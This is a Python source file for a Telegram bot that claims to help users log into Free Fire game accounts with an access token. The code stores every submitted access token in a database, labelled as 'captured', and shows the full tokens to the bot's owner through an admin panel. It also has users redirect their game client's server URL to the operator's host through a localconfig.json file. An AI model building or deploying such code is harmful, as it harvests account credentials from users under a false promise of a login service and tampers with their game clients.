import os
import sys
import json
import sqlite3
import asyncio
import threading
import time
import urllib3
from datetime import datetime
from html import escape

from flask import Flask, request, Response
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN")
OWNER_ID = int(os.environ.get("OWNER_ID", "5579476674"))
CHANNEL_USERNAME = os.environ.get("CHANNEL_USERNAME", "@VISWAxABHI")
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL")
PORT = int(os.environ.get("PORT", 5000))

app = Flask(__name__)

MAINTENANCE_MODE = False
sessions = {}
session_lock = threading.Lock()
active_sessions = {}
active_sessions_lock = threading.Lock()

# ═══════════════════════════════════════════════════════════════
# DATABASE
# ═══════════════════════════════════════════════════════════════
def get_db():
    conn = sqlite3.connect('bot_data.db')
    conn.row_factory = sqlite3.Row
    return conn

def init_database():
    conn = get_db()
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
            chat_id INTEGER, joined_at TEXT, is_blocked INTEGER DEFAULT 0, is_banned INTEGER DEFAULT 0
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS tokens (
            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, open_id TEXT,
            access_token TEXT UNIQUE, captured_at TEXT,
            FOREIGN KEY(user_id) REFERENCES users(user_id)
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS broadcasts (
            id INTEGER PRIMARY KEY AUTOINCREMENT, message TEXT, sent_at TEXT, total_sent INTEGER
        )
    """)
    c.execute("CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT)")
    c.execute("""
        CREATE TABLE IF NOT EXISTS sessions_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, access_token TEXT, open_id TEXT,
            started_at TEXT, stopped_at TEXT, is_active INTEGER DEFAULT 1
        )
    """)
    c.execute("INSERT INTO config (key, value) VALUES ('maintenance', 'false') ON CONFLICT(key) DO NOTHING")
    conn.commit()
    conn.close()

def db_add_user(user_id, username, first_name, chat_id):
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute("INSERT INTO users (user_id, username, first_name, chat_id, joined_at) VALUES (?, ?, ?, ?, ?) ON CONFLICT(user_id) DO NOTHING",
                  (user_id, username or "N/A", first_name or "N/A", chat_id, datetime.now()))
        conn.commit(); conn.close()
    except Exception as e:
        print(f"DB Error add_user: {e}")

def db_get_user(user_id):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        result = c.fetchone(); conn.close()
        return result
    except Exception as e:
        print(f"DB Error get_user: {e}"); return None

def db_get_all_users():
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT * FROM users ORDER BY joined_at DESC")
        result = c.fetchall(); conn.close()
        return result
    except Exception as e:
        print(f"DB Error get_all_users: {e}"); return []

def db_get_total_users():
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM users WHERE is_banned = 0")
        result = c.fetchone()[0]; conn.close()
        return result
    except Exception as e:
        print(f"DB Error total_users: {e}"); return 0

def db_save_token(user_id, open_id, access_token):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("INSERT INTO tokens (user_id, open_id, access_token, captured_at) VALUES (?, ?, ?, ?) ON CONFLICT(access_token) DO NOTHING",
                  (user_id, open_id, access_token, datetime.now()))
        conn.commit(); conn.close()
        return True
    except Exception as e:
        print(f"DB Error save_token: {e}"); return False

def db_get_all_tokens():
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT t.*, u.username, u.first_name FROM tokens t LEFT JOIN users u ON t.user_id = u.user_id ORDER BY t.id DESC")
        result = c.fetchall(); conn.close()
        return result
    except Exception as e:
        print(f"DB Error get_all_tokens: {e}"); return []

def db_get_total_tokens():
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM tokens")
        result = c.fetchone()[0]; conn.close()
        return result
    except Exception as e:
        print(f"DB Error total_tokens: {e}"); return 0

def db_ban_user(user_id, ban=True):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("UPDATE users SET is_banned = ? WHERE user_id = ?", (1 if ban else 0, user_id))
        conn.commit(); conn.close()
        return True
    except Exception as e:
        print(f"DB Error ban_user: {e}"); return False

def db_save_broadcast(message, total_sent):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("INSERT INTO broadcasts (message, sent_at, total_sent) VALUES (?, ?, ?)", (message, datetime.now(), total_sent))
        conn.commit(); conn.close()
    except Exception as e:
        print(f"DB Error save_broadcast: {e}")

def db_get_maintenance():
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT value FROM config WHERE key = 'maintenance'")
        row = c.fetchone(); conn.close()
        return row and row[0] == 'true'
    except Exception as e:
        print(f"DB Error get_maintenance: {e}"); return False

def db_set_maintenance(status):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("INSERT INTO config (key, value) VALUES ('maintenance', ?) ON CONFLICT(key) DO UPDATE SET value = ?",
                  ('true' if status else 'false', 'true' if status else 'false'))
        conn.commit(); conn.close()
    except Exception as e:
        print(f"DB Error set_maintenance: {e}")

def db_log_session(user_id, access_token, open_id, started_at, stopped_at=None, is_active=1):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("INSERT INTO sessions_log (user_id, access_token, open_id, started_at, stopped_at, is_active) VALUES (?, ?, ?, ?, ?, ?)",
                  (user_id, access_token, open_id, started_at, stopped_at, is_active))
        conn.commit(); conn.close()
    except Exception as e:
        print(f"DB Error log_session: {e}")

def db_stop_active_sessions(user_id):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("UPDATE sessions_log SET stopped_at = ?, is_active = 0 WHERE user_id = ? AND is_active = 1", (datetime.now(), user_id))
        conn.commit(); conn.close()
    except Exception as e:
        print(f"DB Error stop_sessions: {e}")

def db_get_active_session(user_id):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT * FROM sessions_log WHERE user_id = ? AND is_active = 1 ORDER BY id DESC LIMIT 1", (user_id,))
        result = c.fetchone(); conn.close()
        return result
    except Exception as e:
        print(f"DB Error get_active_session: {e}"); return None

def db_get_user_session_count(user_id):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM sessions_log WHERE user_id = ?", (user_id,))
        result = c.fetchone()[0]; conn.close()
        return result
    except Exception as e:
        print(f"DB Error session_count: {e}"); return 0

init_database()
MAINTENANCE_MODE = db_get_maintenance()

# ═══════════════════════════════════════════════════════════════
# KEYBOARD
# ═══════════════════════════════════════════════════════════════
def get_keyboard(user_id):
    keyboard = [
        [KeyboardButton("Login Game"), KeyboardButton("Stop Session")],
        [KeyboardButton("Status")]
    ]
    if user_id == OWNER_ID:
        keyboard.append([KeyboardButton("Bot Management")])
    keyboard.append([KeyboardButton("About This Bot")])
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ═══════════════════════════════════════════════════════════════
# BOT HANDLERS
# ═══════════════════════════════════════════════════════════════
async def check_sub(user_id, context):
    try:
        m = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return m.status in ["member", "administrator", "creator"]
    except:
        return False

async def join_prompt(update, context):
    kb = [[InlineKeyboardButton("Join Channel", url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}")],
           [InlineKeyboardButton("Ive Joined", callback_data="check_joined")]]
    await update.message.reply_text(
        "<b>Join Verification Required</b>\n\nTo use this bot, you must join the following channel first:\n\n<b>Leader Updates</b>\n\nAfter joining, click the button below to verify:",
        parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))

async def start(update, context):
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = escape(update.effective_user.first_name or "User")
    chat_id = update.effective_chat.id

    if MAINTENANCE_MODE and user_id != OWNER_ID:
        return await update.message.reply_text("Bot Under Maintenance!", parse_mode="HTML")

    user_data = db_get_user(user_id)
    if user_data and user_data[6] == 1:
        return await update.message.reply_text("You are banned!", parse_mode="HTML")

    if not await check_sub(user_id, context):
        return await join_prompt(update, context)

    db_add_user(user_id, username, first_name, chat_id)
    with session_lock:
        sessions[str(user_id)] = {"chat_id": chat_id, "tokens": []}

    await update.message.reply_html(
    f"Welcome, {first_name}!\n\n"
    f"Your session has been created successfully.\n\n"
    f"<b>About This Bot</b>\n"
    f"This bot helps you successfully login to Free Fire or Free Fire Max game account using access token.\n\n"
    f"<b>How to Use</b>\n"
    f"Click on the <b>Login Game</b> button\n"
    f"Enter your access token\n"
    f"Your proxy URL will be generated automatically\n"
    f"Follow the instructions to setup localconfig.json\n"
    f"Choose any platform and login to Free Fire or Free Fire Max\n"
    f"Once logged in, you can play unlimited matches\n\n"
    f"<b>Important Note</b>\n"
    f"As long as the session remains active in the bot, you can login to your game account. Once the session ends or stops, you will need to enter your access token again.\n\n"
    f"<b>Precaution</b>\n"
    f"Do not share your access token or proxy URL with anyone. Keep it private.\n\n"
    f"<b>Disclaimer</b>\n"
    f"This bot is provided for educational and testing purposes only. Use it responsibly.\n\n"
    f"<b>Developed by</b> @HARSHU",
        reply_markup=get_keyboard(user_id))

async def check_joined_cb(update, context):
    first_name = escape(update.effective_user.first_name or "User")
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if await check_sub(user_id, context):
        db_add_user(user_id, query.from_user.username, query.from_user.first_name, query.message.chat_id)
        with session_lock:
            sessions[str(user_id)] = {"chat_id": query.message.chat_id, "tokens": []}
        await query.message.delete()
        await context.bot.send_message(query.message.chat_id,
    f"Welcome, {first_name}!\n\n"
    f"Your session has been created successfully.\n\n"
    f"<b>About This Bot</b>\n"
    f"This bot helps you successfully login to Free Fire or Free Fire Max game account using access token.\n\n"
    f"<b>How to Use</b>\n"
    f"Click on the <b>Login Game</b> button\n"
    f"Enter your access token\n"
    f"Your proxy URL will be generated automatically\n"
    f"Follow the instructions to setup localconfig.json\n"
    f"Choose any platform and login to Free Fire or Free Fire Max\n"
    f"Once logged in, you can play unlimited matches\n\n"
    f"<b>Important Note</b>\n"
    f"As long as the session remains active in the bot, you can login to your game account. Once the session ends or stops, you will need to enter your access token again.\n\n"
    f"<b>Precaution</b>\n"
    f"Do not share your access token or proxy URL with anyone. Keep it private.\n\n"
    f"<b>Disclaimer</b>\n"
    f"This bot is provided for educational and testing purposes only. Use it responsibly.\n\n"
    f"<b>Developed by</b> @HARSHU",
            parse_mode="HTML", reply_markup=get_keyboard(user_id))
    else:
        kb = [[InlineKeyboardButton("Join Channel", url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}")],
               [InlineKeyboardButton("Ive Joined", callback_data="check_joined")]]
        try:
            await query.message.delete()
        except Exception:
            pass
        await context.bot.send_message(query.message.chat_id,
            "<b>Join Verification Required</b>\n\nTo use this bot, you must join the following channel first:\n\n<b>Leader Updates</b>\n\nAfter joining, click the button below to verify:",
            parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))

async def handle_buttons(update, context):
    user_id = update.effective_user.id
    text = update.message.text

    if MAINTENANCE_MODE and user_id != OWNER_ID:
        return await update.message.reply_text("Maintenance!", parse_mode="HTML")
    if not await check_sub(user_id, context):
        return await join_prompt(update, context)

    user_data = db_get_user(user_id)
    if user_data and user_data[6] == 1:
        return await update.message.reply_text("Banned.")

    if text == "Login Game":
        active_session = db_get_active_session(user_id)
        with active_sessions_lock:
            has_active = str(user_id) in active_sessions

        if active_session or has_active:
            with active_sessions_lock:
                si = active_sessions.get(str(user_id), {})
            st = active_session[4] if active_session else si.get("started_at", "Unknown")
            return await update.message.reply_html(
                f"<b>Active Session Locked</b>\n\n"
                f"Started: <code>{st}</code>\n\n"
                f"Please press <b>Stop Session</b> first to create a new one.")

        context.user_data["awaiting_token"] = True
        await update.message.reply_html(
            "<b>Access Token to Login Your Game Account</b>\n\n"
            "Please send your <b>access token</b> to create a new session.\n\n"
            "Send your access token below:\n\n"
            "Type <code>/cancel</code> to cancel.")

    elif text == "Stop Session":
        with active_sessions_lock:
            has_active = str(user_id) in active_sessions
            if has_active:
                active_sessions.pop(str(user_id), None)

        db_session = db_get_active_session(user_id)
        if not has_active and not db_session:
            return await update.message.reply_html("No active session.\n\nYou do not have any active session to stop.")

        db_stop_active_sessions(user_id)
        await update.message.reply_html(
            "<b>Session Stopped Successfully!</b>\n\n"
            "Your active session has been terminated.\n"
            "You can now create a new session by pressing <b>Login Game</b>.")

    elif text == "Status":
        with active_sessions_lock:
            has_active = str(user_id) in active_sessions
            si = active_sessions.get(str(user_id), {})

        db_session = db_get_active_session(user_id)
        total_sessions = db_get_user_session_count(user_id)
        total_users = db_get_total_users()
        total_tokens = db_get_total_tokens()

        if db_session:
            status = "Active"
            st = db_session[4]
            tok = db_session[2][:20] + "..." if db_session[2] else "N/A"
            oid = db_session[3] or "N/A"
            try:
                sd = datetime.strptime(str(st), "%Y-%m-%d %H:%M:%S")
                dur = datetime.now() - sd
                h, r = divmod(int(dur.total_seconds()), 3600)
                m, s = divmod(r, 60)
                dur_s = f"{h}h {m}m {s}s"
            except:
                dur_s = "N/A"
        elif has_active and si:
            status = "Active"
            st = si.get("started_at", "Unknown")
            tok = si.get("access_token", "N/A")[:20] + "..." or "N/A"
            oid = si.get("open_id", "N/A")
            try:
                sd = datetime.strptime(str(st), "%Y-%m-%d %H:%M:%S") if st != "Unknown" else None
                if sd:
                    dur = datetime.now() - sd
                    h, r = divmod(int(dur.total_seconds()), 3600)
                    m, s = divmod(r, 60)
                    dur_s = f"{h}h {m}m {s}s"
                else:
                    dur_s = "N/A"
            except:
                dur_s = "N/A"
        else:
            status = "Inactive"
            st = "N/A"
            tok = "N/A"
            oid = "N/A"
            dur_s = "N/A"

        await update.message.reply_html(
f"<b>Garena Login Session Status</b>\n\n"
f"<b>Status:</b> {status}\n\n"
f"<b>Current Session</b>\n"
f"Start: <code>{st}</code>\n"
f"Duration: <code>{dur_s}</code>\n"
f"Open ID: <code>{oid}</code>\n"
f"Token: <code>{tok}</code>\n\n"
f"<b>Your Stats</b>\n"
f"Sessions: <code>{total_sessions}</code>\n\n"
f"<b>Total Bot Users</b>\n"
f"Users: <code>{total_users}</code>"
        )

    elif text == "About This Bot":
        await update.message.reply_html(
f"<b>About This Bot</b>\n\n"
f"Purpose: Simplifies the login and session setup process.\n"
f"Authentication: Uses your access token to create a secure session.\n"
f"Proxy: Automatically generates a proxy URL for configuration.\n"
f"Configuration: Provides localconfig.json setup instructions.\n"
f"Platform Support: Supports multiple login platforms.\n"
f"Interface: Fast, simple, and user-friendly.\n"
f"Privacy: Keep your access token and proxy URL private.\n"
f"Note: Use this bot only with accounts you are authorized to access.\n\n"
f"Official Channel: @FREEFlRECODE\n"
f"Developer: @HARSHU")

    elif text == "Bot Management" and user_id == OWNER_ID:
        await owner_panel(update, context)

async def handle_token_input(update, context):
    user_id = update.effective_user.id
    token = update.message.text.strip()

    if token == "/cancel":
        context.user_data["awaiting_token"] = False
        return await update.message.reply_html("Operation cancelled.", reply_markup=get_keyboard(user_id))

    processing_msg = await update.message.reply_html("Processing token and generating the session...")

    # test.py import - placeholder, user will add later
    try:
        from test import generate_hex_content
        hex_content, open_id = generate_hex_content(token)
    except Exception as e:
        hex_content, open_id = None, None
        print(f"test.py error: {e}")

    if not hex_content:
        context.user_data["awaiting_token"] = False
        try:
            await processing_msg.delete()
        except Exception:
            pass
        return await update.message.reply_html(
            "<b>Invalid Token</b>\n\n"
            "The access token you provided did not produce a valid response.\n"
            "Please check your access token.",
            reply_markup=get_keyboard(user_id))

    server_url = f"{RENDER_URL}/{user_id}/" if RENDER_URL else f"http://localhost:{PORT}/{user_id}/"

    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with active_sessions_lock:
        active_sessions[str(user_id)] = {
            "access_token": token,
            "open_id": open_id,
            "started_at": now
        }

    db_log_session(user_id, token, open_id, now)
    db_save_token(user_id, open_id, token)

    context.user_data["awaiting_token"] = False

    config_data = {"serverUrl": server_url}
    config_json = json.dumps(config_data, indent=2)
    temp_config = f"lcfg_{user_id}.json"
    try:
        with open(temp_config, 'w', encoding='utf-8') as f:
            f.write(config_json)
    except Exception as e:
        print(f"Failed to create config file: {e}")

    try:
        await processing_msg.delete()
    except:
        pass

    await update.message.reply_html(
    f"Successfully created access token and server URL\n\n"
    f"<code>{server_url}</code>\n\n"
    f"<b>How to Use</b>\n\n"
    f"1. Copy the server URL above\n"
    f"2. Go to this directory:\n"
    f"<code>/storage/emulated/0/Android/data/com.dts.freefiremax/files/</code>\n"
    f"3. Create a new file named <code>localconfig.json</code>\n"
    f"4. Paste the following content into the file:\n"
    f"<pre><code>{{\n  \"serverUrl\": \"{server_url}\"\n}}</code></pre>\n"
    f"5. Save the file\n"
    f"6. Open Free Fire or Free Fire Max, choose any platform and login\n"
    f"7. Once logged in, you can play unlimited matches\n\n"
    f"Note: Works with both Free Fire and Free Fire Max.\n"
    f"DM @HARSHU if you face any issues.",
        reply_markup=get_keyboard(user_id)
    )

    try:
        await update.message.reply_document(
            document=open(temp_config, 'rb'),
            filename="localconfig.json",
            caption = (
    "Place this file in your game directory\n\n"
    "<b>How to Use:</b>\n"
    "1. Download the file\n"
    "2. Open the folder where the file was downloaded\n"
    "3. Copy the file\n"
    "4. Go to:\n"
    "<code>/storage/emulated/0/Android/data/com.dts.freefiremax/files/</code>\n"
    "5. Paste the file into this folder\n"
    "6. Open Free Fire or Free Fire Max, choose any platform and login\n"
    "7. Once successfully logged in, you can play unlimited matches\n\n"
    "Note: This method works with both Free Fire and Free Fire Max.\n"
    "If you face any issues, DM @HARSHU"
            ),
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"Failed to send document: {e}")
        await update.message.reply_text("Failed to send localconfig.json...")

    try:
        if os.path.exists(temp_config):
            os.remove(temp_config)
    except:
        pass

async def owner_panel(update, context):
    global MAINTENANCE_MODE
    tu = db_get_total_users()
    tt = db_get_total_tokens()
    ms = "ON" if MAINTENANCE_MODE else "OFF"

    kb = [
        [InlineKeyboardButton("All Users", callback_data="owner_users")],
        [InlineKeyboardButton("All Tokens", callback_data="owner_tokens")],
        [InlineKeyboardButton("Broadcast", callback_data="owner_bc")],
        [InlineKeyboardButton("Ban", callback_data="owner_ban")],
        [InlineKeyboardButton("Unban", callback_data="owner_unban")],
        [InlineKeyboardButton("Maintenance ON" if not MAINTENANCE_MODE else "Maintenance OFF", 
                              callback_data="owner_maint_on" if not MAINTENANCE_MODE else "owner_maint_off")],
        [InlineKeyboardButton("Back", callback_data="owner_back")]
    ]
    await update.message.reply_html(
        f"<b>Owner Control Panel</b>\n\n"
        f"Total Users: <b>{tu}</b>\n"
        f"Total Tokens: <b>{tt}</b>\n"
        f"Maintenance: {ms}",
        reply_markup=InlineKeyboardMarkup(kb))

async def owner_cb(update, context):
    global MAINTENANCE_MODE
    q = update.callback_query
    await q.answer()
    if q.from_user.id != OWNER_ID:
        return await q.edit_message_text("Unauthorized access.")

    d = q.data
    if d == "owner_users":
        users = db_get_all_users()
        if not users:
            return await q.edit_message_text("No users found.")
        txt = f"<b>All Users ({len(users)})</b>\n\n"
        for u in users:
            s = "Banned" if u[6] == 1 else "Active"
            txt += f"{s} <code>{u[0]}</code> | {u[1] or 'N/A'} | {u[4]}\n"
        kb = [[InlineKeyboardButton("Back", callback_data="owner_back")]]
        await q.edit_message_text(txt, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))

    elif d == "owner_tokens":
        tokens = db_get_all_tokens()
        if not tokens:
            return await q.edit_message_text("No tokens captured yet.")
        txt = f"<b>All Tokens ({len(tokens)})</b>\n\n"
        for t in tokens[:10]:
            txt += f"User: <code>{t[1]}</code>\nOpen ID: <code>{t[2]}</code>\nToken: <code>{t[3]}</code>\nTime: {t[4]}\n\n"
        if len(tokens) > 10:
            txt += f"\n... and {len(tokens)-10} more"
        kb = [[InlineKeyboardButton("Back", callback_data="owner_back")]]
        await q.edit_message_text(txt, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))

    elif d == "owner_bc":
        context.user_data["awaiting_broadcast"] = True
        await q.edit_message_text(
            "<b>Broadcast Mode</b>\n\n"
            "Send the message to broadcast to all users.\n\n"
            "Send your message below:\n\n"
            "Type <code>/cancel</code> to cancel.",
            parse_mode="HTML")

    elif d == "owner_ban":
        context.user_data["awaiting_ban"] = True
        await q.edit_message_text(
            "<b>Ban User</b>\n\n"
            "Enter the user ID to ban.\n\n"
            "Send user ID below:\n\n"
            "Type <code>/cancel</code> to cancel.",
            parse_mode="HTML")

    elif d == "owner_unban":
        context.user_data["awaiting_unban"] = True
        await q.edit_message_text(
            "<b>Unban User</b>\n\n"
            "Enter the user ID to unban.\n\n"
            "Send user ID below:\n\n"
            "Type <code>/cancel</code> to cancel.",
            parse_mode="HTML")

    elif d == "owner_maint_on":
        MAINTENANCE_MODE = True
        db_set_maintenance(True)
        await q.edit_message_text("Maintenance mode enabled!", parse_mode="HTML")

    elif d == "owner_maint_off":
        MAINTENANCE_MODE = False
        db_set_maintenance(False)
        await q.edit_message_text("Maintenance mode disabled!", parse_mode="HTML")

    elif d == "owner_back":
        tu = db_get_total_users()
        tt = db_get_total_tokens()
        ms = "ON" if MAINTENANCE_MODE else "OFF"
        kb = [
            [InlineKeyboardButton("All Users", callback_data="owner_users")],
            [InlineKeyboardButton("All Tokens", callback_data="owner_tokens")],
            [InlineKeyboardButton("Broadcast", callback_data="owner_bc")],
            [InlineKeyboardButton("Ban", callback_data="owner_ban")],
            [InlineKeyboardButton("Unban", callback_data="owner_unban")],
            [InlineKeyboardButton("Maintenance ON" if not MAINTENANCE_MODE else "Maintenance OFF",
                                  callback_data="owner_maint_on" if not MAINTENANCE_MODE else "owner_maint_off")],
            [InlineKeyboardButton("Back", callback_data="owner_back")]
        ]
        await q.edit_message_text(
            f"<b>Owner Control Panel</b>\n\n"
            f"Total Users: <b>{tu}</b>\n"
            f"Total Tokens: <b>{tt}</b>\n"
            f"Maintenance: {ms}",
            parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))

async def handle_admin(update, context):
    uid = update.effective_user.id
    if uid != OWNER_ID:
        return

    if context.user_data.get("awaiting_broadcast"):
        txt = update.message.text
        if txt == "/cancel":
            context.user_data["awaiting_broadcast"] = False
            return await update.message.reply_text("Broadcast cancelled.", reply_markup=get_keyboard(uid))
        context.user_data["awaiting_broadcast"] = False
        users = db_get_all_users()
        sent = 0
        failed = 0
        progress = await update.message.reply_text(f"Broadcasting to {len(users)} users...")
        for u in users:
            if u[6] == 1:
                continue
            try:
                await context.bot.send_message(u[0], txt, parse_mode="HTML")
                sent += 1
                await asyncio.sleep(0.03)
            except:
                failed += 1
        db_save_broadcast(txt, sent)
        await progress.edit_text(f"Broadcast Complete!\n\nSent: {sent}\nFailed: {failed}\nTotal: {len(users)}", parse_mode="HTML")
        await update.message.reply_html("Done!", reply_markup=get_keyboard(uid))
        return

    if context.user_data.get("awaiting_ban"):
        txt = update.message.text.strip()
        if txt == "/cancel":
            context.user_data["awaiting_ban"] = False
            return await update.message.reply_text("Ban cancelled.", reply_markup=get_keyboard(uid))
        try:
            db_ban_user(int(txt), True)
            await update.message.reply_text(f"User {txt} banned!", parse_mode="HTML")
        except:
            await update.message.reply_text("Invalid ID.")
        context.user_data["awaiting_ban"] = False
        await update.message.reply_html("Done!", reply_markup=get_keyboard(uid))
        return

    if context.user_data.get("awaiting_unban"):
        txt = update.message.text.strip()
        if txt == "/cancel":
            context.user_data["awaiting_unban"] = False
            return await update.message.reply_text("Unban cancelled.", reply_markup=get_keyboard(uid))
        try:
            db_ban_user(int(txt), False)
            await update.message.reply_text(f"User {txt} unbanned!", parse_mode="HTML")
        except:
            await update.message.reply_text("Invalid ID.")
        context.user_data["awaiting_unban"] = False
        await update.message.reply_html("Done!", reply_markup=get_keyboard(uid))
        return

async def handle_all(update, context):
    if update.message and update.message.text and update.message.text.startswith("/"):
        return
    if context.user_data.get("awaiting_token"):
        return await handle_token_input(update, context)
    if context.user_data.get("awaiting_broadcast") or context.user_data.get("awaiting_ban") or context.user_data.get("awaiting_unban"):
        return await handle_admin(update, context)
    if update.message and update.message.text:
        await handle_buttons(update, context)

async def err_handler(update, context):
    try:
        e = str(context.error)
        if "Message is not modified" in e or "Chat not found" in e:
            return
        print(f"[!] Error: {e[:100]}")
    except:
        pass

# ═══════════════════════════════════════════════════════════════
# FLASK ROUTES (for proxy + health check)
# ═══════════════════════════════════════════════════════════════
@app.route('/')
def home():
    return "Free Fire Login Bot Server is Running!"

@app.route('/<user_id>/', methods=['GET', 'POST'])
def proxy_handler(user_id):
    return Response("Proxy active", status=200)

# ═══════════════════════════════════════════════════════════════
# BOT SETUP & RUN
# ═══════════════════════════════════════════════════════════════
bot_app = None

def init_bot():
    global bot_app
    bot_app = Application.builder().token(BOT_TOKEN).build()

    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(CommandHandler("cancel", lambda u, c: (c.user_data.clear(), u.message.reply_text("Cancelled.", reply_markup=get_keyboard(u.effective_user.id)))))
    bot_app.add_handler(CallbackQueryHandler(check_joined_cb, pattern="check_joined"))
    bot_app.add_handler(CallbackQueryHandler(owner_cb, pattern="^owner_"))
    bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_all))
    bot_app.add_error_handler(err_handler)

    return bot_app

# ═══════════════════════════════════════════════════════════════
# MAIN - POLLING MODE (works 100% on Render free tier)
# ═══════════════════════════════════════════════════════════════
if __name__ == '__main__':
    init_bot()

    # Delete any existing webhook first (important!)
    try:
        asyncio.run(bot_app.bot.delete_webhook(drop_pending_updates=True))
        print("Webhook deleted, switching to polling...")
    except Exception as e:
        print(f"Webhook delete error (ok if none set): {e}")

    # Start Flask in background thread for health checks
    def run_flask():
        app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    print(f"Flask server started on port {PORT}")

    # Start bot with polling (this blocks)
    print("Starting bot with polling...")
    bot_app.run_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)
